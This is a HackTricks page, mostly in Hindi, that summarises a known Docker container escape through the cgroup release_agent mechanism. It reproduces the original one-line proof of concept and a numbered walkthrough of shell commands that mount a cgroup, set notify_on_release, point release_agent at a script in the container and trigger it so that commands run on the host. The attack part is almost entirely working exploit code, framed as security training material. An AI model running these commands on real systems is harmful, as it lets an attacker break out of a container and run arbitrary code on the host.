# Docker release\_agent cgroups escape

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


**अधिक जानकारी के लिए, कृपया** [**मूल ब्लॉग पोस्ट**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)** को देखें।** यह केवल एक सारांश है:

Original PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
The proof of concept (PoC) demonstrates a method to exploit cgroups by creating a `release_agent` file and triggering its invocation to execute arbitrary commands on the container host. Here's a breakdown of the steps involved:

1. **पर्यावरण तैयार करें:**
* एक निर्देशिका `/tmp/cgrp` बनाई जाती है जो cgroup के लिए माउंट पॉइंट के रूप में कार्य करती है।
* RDMA cgroup नियंत्रक को इस निर्देशिका में माउंट किया जाता है। RDMA नियंत्रक की अनुपस्थिति की स्थिति में, वैकल्पिक के रूप में `memory` cgroup नियंत्रक का उपयोग करने की सिफारिश की जाती है।
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **बच्चे Cgroup सेट करें:**
* एक बच्चे cgroup जिसका नाम "x" है, माउंट किए गए cgroup निर्देशिका के भीतर बनाया गया है।
* "x" cgroup के लिए सूचनाएँ सक्षम की जाती हैं, इसके notify\_on\_release फ़ाइल में 1 लिखकर।
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **रिलीज एजेंट को कॉन्फ़िगर करें:**
* होस्ट पर कंटेनर का पथ /etc/mtab फ़ाइल से प्राप्त किया जाता है।
* फिर cgroup की release\_agent फ़ाइल को प्राप्त किए गए होस्ट पथ पर स्थित /cmd नामक स्क्रिप्ट को निष्पादित करने के लिए कॉन्फ़िगर किया जाता है।
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **/cmd स्क्रिप्ट बनाएं और कॉन्फ़िगर करें:**
* /cmd स्क्रिप्ट कंटेनर के अंदर बनाई जाती है और इसे ps aux निष्पादित करने के लिए कॉन्फ़िगर किया जाता है, जिसका आउटपुट कंटेनर में /output नामक फ़ाइल में पुनर्निर्देशित किया जाता है। होस्ट पर /output का पूरा पथ निर्दिष्ट किया गया है।
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **हमला शुरू करें:**
* "x" चाइल्ड cgroup के भीतर एक प्रक्रिया शुरू की जाती है और तुरंत समाप्त कर दी जाती है।
* यह `release_agent` (जो /cmd स्क्रिप्ट है) को सक्रिय करता है, जो होस्ट पर ps aux चलाता है और आउटपुट को कंटेनर के भीतर /output पर लिखता है।
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
{% hint style="success" %}
सीखें और AWS हैकिंग का अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
सीखें और GCP हैकिंग का अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **हमें** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो करें।**
* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।

</details>
{% endhint %}
